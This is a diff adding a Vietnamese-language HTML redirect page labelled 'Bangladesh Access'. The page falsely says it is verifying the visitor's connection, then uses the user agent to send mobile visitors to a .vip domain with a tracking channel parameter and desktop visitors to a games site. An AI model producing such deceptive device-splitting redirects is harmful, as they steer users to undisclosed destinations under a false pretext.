@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Bangladesh Redirect…</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: radial-gradient(circle at top, #1d4ed8 0, #020617 45%, #000 100%);
+      color: #e5e7eb;
+    }
+
+    .bg-orb {
+      position: fixed;
+      border-radius: 999px;
+      filter: blur(40px);
+      opacity: 0.5;
+      z-index: 0;
+    }
+
+    .bg-orb.orb-1 {
+      width: 260px;
+      height: 260px;
+      background: #22c55e;
+      top: -60px;
+      left: -40px;
+    }
+
+    .bg-orb.orb-2 {
+      width: 220px;
+      height: 220px;
+      background: #f97316;
+      bottom: -40px;
+      right: -60px;
+    }
+
+    .overlay {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      z-index: 10;
+    }
+
+    .card {
+      position: relative;
+      width: 100%;
+      max-width: 420px;
+      padding: 26px 22px 24px;
+      border-radius: 24px;
+      background: rgba(15, 23, 42, 0.92);
+      border: 1px solid rgba(148, 163, 184, 0.4);
+      box-shadow:
+        0 25px 70px rgba(0,0,0,0.8),
+        0 0 0 1px rgba(15,23,42,0.7);
+      text-align: center;
+      backdrop-filter: blur(16px);
+    }
+
+    .flag-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 12px;
+      border-radius: 999px;
+      background: rgba(15, 118, 110, 0.2);
+      border: 1px solid rgba(45, 212, 191, 0.6);
+      font-size: 11px;
+      letter-spacing: 1.8px;
+      text-transform: uppercase;
+      color: #a5f3fc;
+      margin-bottom: 14px;
+    }
+
+    .flag-circle {
+      width: 16px;
+      height: 16px;
+      border-radius: 999px;
+      background: #15803d;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .flag-circle::after {
+      content: "";
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      border-radius: 999px;
+      background: #dc2626;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    h1 {
+      font-size: 22px;
+      margin: 0 0 8px;
+      color: #f9fafb;
+    }
+
+    .subtitle {
+      font-size: 13px;
+      color: #cbd5f5;
+      margin-bottom: 22px;
+      line-height: 1.5;
+    }
+
+    .loader-ring {
+      width: 44px;
+      height: 44px;
+      border-radius: 999px;
+      border: 3px solid rgba(148,163,184,0.35);
+      border-top-color: #facc15;
+      margin: 0 auto 14px;
+      animation: spin 1s linear infinite;
+    }
+
+    .progress {
+      width: 100%;
+      height: 4px;
+      border-radius: 999px;
+      background: rgba(30, 64, 175, 0.6);
+      overflow: hidden;
+      margin-bottom: 8px;
+    }
+
+    .progress-bar {
+      width: 0%;
+      height: 100%;
+      border-radius: inherit;
+      background: linear-gradient(90deg, #22c55e, #facc15, #f97316);
+      animation: loading 2.6s ease-out forwards;
+    }
+
+    .countdown {
+      font-size: 11px;
+      color: #9ca3af;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes loading {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
+
+    @media (max-width: 400px) {
+      .card {
+        padding: 22px 18px 20px;
+      }
+
+      h1 {
+        font-size: 20px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Background glow -->
+  <div class="bg-orb orb-1"></div>
+  <div class="bg-orb orb-2"></div>
+
+  <div class="overlay">
+    <div class="card">
+      <div class="flag-pill">
+        <span class="flag-circle"></span>
+        <span>BANGLADESH ACCESS</span>
+      </div>
+
+      <h1>Đang chuyển hướng cho Bangladesh…</h1>
+
+      <p class="subtitle">
+        Hệ thống đang xác thực kết nối và đưa bạn tới trang khuyến mãi dành riêng cho
+        <strong>Bangladesh</strong>. Vui lòng chờ trong giây lát.
+      </p>
+
+      <div class="loader-ring"></div>
+
+      <div class="progress">
+        <div class="progress-bar"></div>
+      </div>
+
+      <div class="countdown">
+        Tự động chuyển hướng sau <span id="seconds">3</span> giây…
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Đếm ngược hiển thị số giây
+    (function () {
+      var seconds = 3; // đổi được
+      var el = document.getElementById("seconds");
+      var timer = setInterval(function () {
+        seconds--;
+        if (seconds <= 0) {
+          clearInterval(timer);
+        }
+        if (el) el.textContent = seconds;
+      }, 1000);
+    })();
+
+    // Hàm phát hiện mobile/tablet (nếu bạn muốn tách link PC/Mobile)
+    function isMobileOrTablet() {
+      var ua = navigator.userAgent || navigator.vendor || window.opera;
+      var mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Windows Phone/i;
+      return mobileRegex.test(ua);
+    }
+
+    // 🔗 TODO: ĐỔI LINK TẠI ĐÂY CHO PHÙ HỢP BANGLADESH
+    const DESKTOP_URL = "https://gamevui.vn/gamemoi";      // Link cho máy tính (sửa tùy bạn)
+    const MOBILE_URL  = "https://www.khcyz.vip/?ch=4f80366d81";         // Link cho điện thoại Bangladesh
+
+    // Thời gian chờ 2.5 giây rồi chuyển
+    setTimeout(function () {
+      if (isMobileOrTablet()) {
+        window.location.href = MOBILE_URL;
+      } else {
+        window.location.href = DESKTOP_URL;
+      }
+    }, 2500);
+  </script>
+</body>
+</html>
